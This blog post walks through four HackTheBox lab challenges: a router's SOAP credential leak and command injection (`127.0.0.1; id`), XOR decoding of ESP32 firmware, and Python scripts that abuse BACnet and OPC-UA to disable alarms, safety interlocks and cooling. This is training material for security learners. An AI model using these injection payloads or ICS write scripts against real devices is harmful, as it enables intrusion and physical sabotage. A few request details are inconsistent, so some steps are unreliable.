---
title: HackTheBox Challenges
date: 2026-06-08
categories: [HackTheBox, Write-up]
tags: [write-up, tutorial, hackthebox]
author: Mohamad Helmi
description: "HackTheBox challenges write-up"
---
# Intro
I tried some unique challenges on HacktheBox to learn new things from it. The categories are ICS, Hardware, Reversing, and some new web exploitation techniques that I learned from it.

## Plug & Pray (Hardware)
VortexLink Networking ships the GX3000 cable gateway to thousands of homes. A penetration tester has discovered that a test unit exposes an HTTP service. VortexLink insists nothing sensitive is exposed. Prove them wrong.

### Enumeration
Paste the given IP address in the browser, and we'll see the gateway admin UI for a VortexLink GX3000 router — firmware 4.2.1-RELEASE, with UPnP/IGD active.

![Gateway UI](/assets/img/posts/2026-06-08-HackTheBox-challenges/web_page.png)

The UI gives us device context, but the real attack surface is the UPnP device description XML. Navigating to `/rootDesc.xml` reveals two registered services:

- **WANIPConnection:1** — controlURL: `/ctl/IPConn`, SCPD: `/WANIPCn.xml`
- **DiagnosticService:1** — controlURL: `/ctl/Diag`, SCPD: `/diag.xml`

![rootDesc.xml response](/assets/img/posts/2026-06-08-HackTheBox-challenges/rootDesc.png)

### Service Action Enumeration
Fetching both SCPD files lists every available SOAP action for each service.

From `/WANIPCn.xml`, WANIPConnection exposes:
- `GetExternalIPAddress`
- `GetUserName`
- `GetPassword` ← interesting

From `/diag.xml`, DiagnosticService exposes:
- `GetDeviceInfo`
- `RunNetworkTest` ← interesting, accepts a `TargetHost` parameter

### Credential Leak
`GetPassword` requires no authentication. A simple SOAP POST to `/ctl/IPConn` hands us the ISP provisioning password in plaintext.

**Request:**
```bash
curl -s -X POST http://IP:PORT/ctl/IPConn \
  -H 'Content-Type: text/xml' \
  -H 'SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#GetPassword"' \
  -d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:GetPassword xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
    </u:GetPassword>
  </s:Body>
```

**Response:**

```xml
</s:Envelope>'
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:GetPasswordResponse xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
            <NewPassword>Pass</NewPassword>
    </u:GetPasswordResponse>
  </s:Body>
</s:Envelope>
```

The response contains `<NewPassword>Pass</NewPassword>`. No authentication, no rate limiting — just a free credential leak.

### Trust Boundary Pivot
Reading `diag.xml` more carefully reveals that DiagnosticService requires an `X-Diag-Key` header for authentication. The intended key is the ISP provisioning password we just leaked.

This is a classic cross-service trust boundary issue: Service A leaks a secret that Service B blindly trusts.

We confirm access by calling `GetDeviceInfo` with the key:
- X-Diag-Key: Pass
- SOAPAction: "urn:schemas-upnp-org:service:DiagnosticService:1#GetDeviceInfo"

```xml
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:GetDeviceInfoResponse xmlns:u="urn:schemas-upnp-org:service:DiagnosticService:1">
            <ModelName>GX3000</ModelName>
            <FirmwareVersion>4.2.1-RELEASE</FirmwareVersion>
            <Uptime>5681</Uptime>
    </u:GetDeviceInfoResponse>
  </s:Body>
</s:Envelope>  
```

HTTP 200 with device info — we're in.

### Command Injection
`RunNetworkTest` passes the `TargetHost` parameter directly to a shell command (a ping/traceroute/dns wrapper) without sanitization. This is our injection sink.

Before reading the flag, we validate RCE with a harmless payload first:

**Request:**
```bash
curl -s -X POST http://TARGET/ctl/Diag \
  -H 'Content-Type: text/xml' \
  -H 'X-Diag-Key: Gx3000@ISP#2024' \
  -H 'SOAPAction: "urn:schemas-upnp-org:service:DiagnosticService:1#RunNetworkTest"' \
  -d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:RunNetworkTest xmlns:u="urn:schemas-upnp-org:service:DiagnosticService:1">
      <TargetHost>127.0.0.1; id</TargetHost>
      <TestType>ping</TestType>
    </u:RunNetworkTest>
  </s:Body>
</s:Envelope>'
```

![RCE id command output](/assets/img/posts/2026-06-08-HackTheBox-challenges/id_cmd.png)

The `id` output appears inside `<TestResult>` — RCE confirmed, running as root.

### Flag
With RCE confirmed, we read the flag directly:

```xml
<TargetHost>127.0.0.1; cat /app/flag.txt</TargetHost>
```

The flag is returned inside the `<TestResult>` tag in the SOAP response.

### Key Takeaways
This challenge demonstrates a UPnP/SOAP control-plane attack chain that is entirely protocol-driven:

1. `rootDesc.xml` exposes all service URLs and action definitions
2. An unauthenticated SOAP action leaks a credential
3. That credential is reused as an auth header in a second service
4. A user-controlled parameter in that service is passed unsanitized to a shell command

The lesson: always enumerate UPnP description XML before assuming a device exposes nothing sensitive. The admin UI is just context — the attack surface lives in the XML.

---

## Espresso (Hardware)

Someone leaked the new Espresso firmware, can you try to figure out what it does?

### Enumeration

The first step is understanding what we are dealing with. Running `file` on the binary returns `data` — no recognizable format. Checking the size reveals a 4 MB image, which is a typical flash dump size for embedded devices.

![Enum espresso](/assets/img/posts/2026-06-08-HackTheBox-challenges/espresso_enum.png)

Extracting all printable strings from the binary gives us strong context about the firmware's origin:

```bash
strings firmware.bin > output.txt
head output.txt
```

![strings output](/assets/img/posts/2026-06-08-HackTheBox-challenges/output_firmware.png)

The strings reveal:
- Version: `v6.1-dev-2748-g490691bc61`, dated `Feb 28 2026`
- ESP-IDF bootloader messages (partition table, OTA slots, flash map)
- ESP32 component paths referencing `//IDF/components/bootloader_support/...`

This is an **ESP32 firmware flash dump**, built on Espressif's ESP-IDF framework. The binary is mostly empty flash (`0xFF` bytes — approximately 96% of the image), with actual firmware data concentrated in the lower offsets.

Notably, one string stands out in the output:

```
flag did not generate correctly.
```

This hints that the flag exists in the binary but is not stored in plaintext — it has been obfuscated.

### Analysis

Since `strings` does not reveal the flag directly, the obfuscation is likely simple — single-byte XOR is the most common technique used in embedded CTF challenges.

The approach:
1. Scan every byte offset in the binary
2. Assume the known plaintext `HTB{` starts at that offset
3. Derive the XOR key from the first byte: `key = data[offset] ^ ord('H')`
4. Decode 4 bytes with that key and verify it matches `HTB{`
5. If it matches, decode a 128-byte window and extract the full flag with a regex

```python
import sys, os, glob, re

def main():
    if len(sys.argv) >= 2:
        fw_path = sys.argv[1]
    else:
        cands = ["firmware.bin", "factory.bin", "app.bin"] + glob.glob("*.bin")
        fw_path = next((c for c in cands if os.path.isfile(c)), None)
    if not fw_path or not os.path.isfile(fw_path):
        sys.exit(1)

    data = open(fw_path, "rb").read()
    plain = b"HTB{"

    for off in range(0, len(data) - 4):
        key = data[off] ^ plain[0]
        if bytes(b ^ key for b in data[off:off+4]) != plain:
            continue
        window = bytes(b ^ key for b in data[off:off+128])
        m = re.match(rb"HTB\{[ -~]*?\}", window)
        if m:
            print(m.group().decode())
            return

if __name__ == "__main__":
    main()
```

Running the script:

```bash
python3 solve.py firmware.bin
```

### Finding

The flag is found at offset `0x17688` inside the binary. The XOR key is a single byte: `0x42` (ASCII `B`). Decoding the surrounding bytes confirms the pattern — the entire surrounding region is also XOR'd with the same key, filling the non-flag bytes with repeating `B` values.

```
Raw bytes at 0x17688:  0a 16 00 39 71 2f 37 2e 76 36 2b ...
XOR key 0x42 applied:  H  T  B  {  3  m  u  l  4  t  i ...
Decoded:               HTB{FLAG}
```

### Key Takeaways

This challenge demonstrates a classic embedded firmware reversing pattern:

- Flash dumps are mostly empty (`0xFF`) — actual code and data occupy a small region
- `strings` is always the first recon step on a binary blob, even when it won't reveal the answer directly — context clues (SDK version, error messages) narrow down the attack surface
- Single-byte XOR is the simplest obfuscation that defeats `strings`, but is trivially broken with a known-plaintext attack using the flag prefix `HTB{`
- The solve script is portable: it auto-discovers the binary if no argument is provided, and uses a sliding window + regex to handle variable-length flags cleanly

---

## Steel Mountain (ICS)
Steel Mountain is a secure data storage facility serving major corporations. A BACnet device has already been planted inside their network. The objective is to destroy the tape backups stored in the Tape Storage Room by manipulating the building automation system through the exposed BACnet interface.

### Enumeration

The challenge provides two ports — a web dashboard and a raw TCP service. Connecting to the TCP port via netcat drops into a simple menu:

```
1. objects
2. bacnet.read
3. bacnet.write
```

Selecting `1` dumps every BACnet object registered on the device as a single JSON-like dictionary. The full object list spans three floors plus shared infrastructure — elevators, doors, roof air handling units, and per-floor HVAC controls.

The objects relevant to Level 2 (Tape Storage Room):

| Object Name | ID | Type | Description | Present Value |
|---|---|---|---|---|
| `Temp-L2-20` | 20 | analogInput | Current temperature, FL-2 | 19.4°C |
| `Therm-L2-21` | 21 | analogOutput | Thermostat setpoint, FL-2 | 19.0 |
| `ACS-L2-22` | 22 | binaryOutput | Air conditioning [0: OFF, 1: ON] | 1 |
| `OHAP-L2-23` | 23 | analogOutput | Overheat alarm point, FL-2, 25°C | 25.0 |
| `OHA-L2-24` | 24 | binaryInput | Overheat alarm [0: OFF, 1: ON] | 0 |
| `L2-TSR-DR` | 102 | multiStateOutput | TSR door [0: OPEN, 1: CLOSED, 2: LOCKED] | 1 |
| `ELE-1-TF` | 82 | analogOutput | Elevator 1 target floor | 1 |
| `ELE-2-TF` | 85 | analogOutput | Elevator 2 target floor | 3 |
| `AHU1` | 201 | multiStateInput | Roof AHU [0: OFF, 1: COOLING, 2: WARMING] | 1 |
| `AHU2` | 202 | multiStateInput | Roof AHU [0: OFF, 1: COOLING, 2: WARMING] | 1 |

There is no authentication on the write interface. Every object is freely writable by any connected client.

The write command format is:

```
object_type object_id presentValue value
```

### Blueprint Recon

The provided blueprint PDF shows the building across three floors. The Tape Storage Room is on **Level Two**, alongside Office 1, Building Control, and the SOC. This confirms which floor's HVAC objects are in scope and which door object (`L2-TSR-DR`, ID 102) needs to be locked.

### The Alarm Problem

The instructions state the tapes burn at 32°C. However, `OHAP-L2-23` — the overheat alarm point for Level 2 — is currently set to **25°C**. If the floor temperature exceeds that threshold, `OHA-L2-24` fires and the system resets. The target temperature of 32°C sits well above the alarm point, so the alarm must be neutralised before touching the thermostat.

### Exploitation

**Step 1 — Raise the alarm threshold and lock the door.**

Raising `OHAP-L2-23` to a value above 32°C prevents the overheat alarm from triggering during the attack. Then locking `L2-TSR-DR` to state `2` (CLOSED-LOCKED) seals the room.

```
>> 3
analogOutput 23 presentValue 9999

>> 3
multiStateOutput 102 presentValue 2
```

**Step 2 — Block elevator access to Level 2.**

Both elevator target floor objects are set to floor 3, preventing any elevator from stopping at Level 2.

```
>> 3
analogOutput 82 presentValue 3

>> 3
analogOutput 85 presentValue 3
```

**Step 3 — Raise the temperature to 32°C.**

First, the floor's air conditioning is switched off so it cannot counteract the heating. Then both roof AHUs are set to warming mode, and the Level 2 thermostat is pushed to 32°C.

```
>> 3
binaryOutput 22 presentValue 0

>> 3
multiStateInput 201 presentValue 2

>> 3
multiStateInput 202 presentValue 2

>> 3
analogOutput 21 presentValue 32
```

Polling `Temp-L2-20` via `bacnet.read` confirms the temperature climbing. The system requires the temperature to be sustained at or above 32°C for two minutes. Because the server has a watchdog that periodically resets writable values, repeatedly hammering the thermostat write keeps the setpoint from being restored.

```python
import socket, time

HOST, PORT = "154.57.164.65", 32151

def write(obj_type, obj_id, value):
    s = socket.socket()
    s.settimeout(2)
    s.connect((HOST, PORT))
    s.recv(4096)
    s.sendall(b"3\n")
    s.recv(4096)
    s.sendall(f"{obj_type} {obj_id} presentValue {value}\n".encode())
    s.close()

write("analogOutput", 23, 9999)       # Silence alarm
write("multiStateOutput", 102, 2)     # Lock door
write("analogOutput", 82, 3)          # Block elevator 1
write("analogOutput", 85, 3)          # Block elevator 2
write("binaryOutput", 22, 0)          # AC off
write("multiStateInput", 201, 2)      # AHU1 warming
write("multiStateInput", 202, 2)      # AHU2 warming

for _ in range(120):
    write("analogOutput", 21, 32)     # Hold thermostat at 32°C
    time.sleep(1)
```

Once the condition is sustained, the flag appears in the web dashboard (`Message` object, ID 500).

### Key Takeaways

BACnet was designed for isolated plant networks and carries no authentication by default. Every object on this device — doors, elevators, thermostats, alarm setpoints — was writable by any TCP client with no credentials required.

The non-obvious part of this challenge is the alarm bypass. Jumping straight to writing the thermostat without raising `OHAP-L2-23` first causes the overheat alarm to fire and reset the system. Reading the full object list carefully and noting the 25°C alarm threshold before touching anything is what separates a clean solve from a loop of resets.

---

## Dressrosa Reactor (ICS)
An OPC-UA server exposes a nuclear reactor control system. The challenge asks you to trigger a meltdown by abusing writable process nodes — no firewall, no input validation, just raw industrial protocol access.

### Enumeration

The target exposes an OPC-UA endpoint over TCP. OPC-UA is a standard industrial protocol used in SCADA and DCS environments to read and write real-time process data. Unlike REST or SOAP, OPC-UA uses a binary protocol with its own security model based on X.509 certificates and message signing/encryption policies.

![Web Interface](/assets/img/posts/2026-06-08-HackTheBox-challenges/dress_web.png)

Connecting with default credentials `admin:admin` using `SecurityPolicyBasic256Sha256` with `SignAndEncrypt` mode succeeds immediately — the server trusts any self-signed client certificate.

Browsing the address space under namespace `ns=2` reveals the reactor's full process model:

| Node ID | Name | Type |
|---|---|---|
| `ns=2;i=2` | Core Pressure (MPa) | Read |
| `ns=2;i=3` | Core Temperature (°C) | Read |
| `ns=2;i=4` | Reactor Power (MW) | Read |
| `ns=2;i=6` | Fuel Rod Count | Read/Write |
| `ns=2;i=7` | Fuel Rod Temperature | Read/Write |
| `ns=2;i=8` | Fuel Rod Power | Read/Write |
| `ns=2;i=11` | Control Rods Inserted (%) | Read/Write |
| `ns=2;i=12` | Control Rod Material | Read/Write |
| `ns=2;i=25` | SCRAM System | Read/Write |
| `ns=2;i=26` | Primary Pump | Read/Write |
| `ns=2;i=27` | Secondary Pump | Read/Write |
| `ns=2;i=38` | Emergency Cooling Status | Read/Write |
| `ns=2;i=41` | SCRAM Armed | Read/Write |
| `ns=2;i=50` | Power Setpoint | Read/Write |
| `ns=2;i=51` | Reactor Status | Read/Write |

Every safety-critical node is writable. No access control lists, no role separation.

Initial readings at connection time:

```
Power     : ~3500 MW
Temp      : ~280 °C
Pressure  : ~7.2 MPa
```

The reactor is running normally — within safe parameters.

### Certificate Generation

OPC-UA with `Basic256Sha256 / SignAndEncrypt` requires the client to present a valid X.509 certificate. The server does not validate the certificate chain, so a self-signed cert is sufficient.

```python
from cryptography import x509
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes, serialization

private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

cert = (
    x509.CertificateBuilder()
    .subject_name(x509.Name([...]))
    .public_key(private_key.public_key())
    .serial_number(x509.random_serial_number())
    .not_valid_before(now)
    .not_valid_after(now + timedelta(days=365))
    .add_extension(x509.SubjectAlternativeName([x509.DNSName("localhost")]), critical=False)
    .sign(private_key, hashes.SHA256())
)

# Save as DER for asyncua
with open("client_cert.der", "wb") as f:
    f.write(cert.public_bytes(serialization.Encoding.DER))
```

The cert is saved in DER format as required by the `asyncua` Python library.

### Disabling Safety Systems

With a working connection, the attack begins by writing `0` or `False` to every safety interlock node. In a real reactor, these systems are hardware-interlocked and physically separate — here they are plain writable OPC-UA nodes.

```python
safety_nodes = [
    ('ns=2;i=25', 0),      # SCRAM System — off
    ('ns=2;i=26', False),  # Primary Pump — off
    ('ns=2;i=27', False),  # Secondary Pump — off
    ('ns=2;i=38', False),  # Emergency Cooling — off
    ('ns=2;i=41', False),  # SCRAM Armed — disarmed
]

for node_id, value in safety_nodes:
    await client.get_node(node_id).write_value(value)
```

All five safety systems acknowledge the writes with no error. With cooling and SCRAM disabled, the reactor has no mechanism to arrest a runaway reaction.

### Maximising Reactor Output

Control rods moderate the fission reaction by absorbing neutrons — inserting them slows the reactor, withdrawing them accelerates it. Setting insertion to `0` and changing the rod material to `"NONE"` removes all moderation.

```python
await client.get_node('ns=2;i=11').write_value(0)          # Control rods fully withdrawn
await client.get_node('ns=2;i=12').write_value("NONE")     # No absorber material
await client.get_node('ns=2;i=50').write_value(999999)     # Power setpoint — unlimited
await client.get_node('ns=2;i=6').write_value(999999)      # Fuel rod count
await client.get_node('ns=2;i=7').write_value(999999)      # Fuel rod temperature
await client.get_node('ns=2;i=8').write_value(999999)      # Fuel rod power
```

After these writes, power, temperature, and pressure begin climbing in the simulation.

### Triggering Meltdown State

The final step is writing directly to the reactor status node. The simulation accepts the string `"MELTDOWN"` as a valid state value.

```python
await client.get_node('ns=2;i=51').write_value("MELTDOWN")
```

Final readings after the write:

```
Reactor Power     : 999999 MW
Core Temperature  : 999999 °C
Core Pressure     : 999999 MPa
Fuel Rod Power    : 999999 MW
Control Rods      : 0 %
Reactor Status    : MELTDOWN
```

The web monitoring dashboard at the challenge URL updates in real time. The flag appears in the upper-left corner of the page once the meltdown condition is sustained.

### Key Takeaways

The vulnerability chain here is entirely a configuration and access-control failure, not a protocol weakness:

1. The OPC-UA server accepts any self-signed certificate — no PKI trust enforcement
2. Default credentials (`admin:admin`) grant full read/write access
3. Safety-critical nodes carry no write restrictions — SCRAM, cooling, and control rods are all writable by any authenticated session
4. The reactor status node accepts arbitrary string input including `"MELTDOWN"`

OPC-UA has a rich security model: certificate pinning, role-based access per node, signed audit trails. None of it was configured. The lesson is that enabling a secure transport layer (`SignAndEncrypt`) means nothing if the application layer places no restrictions on who can write to what.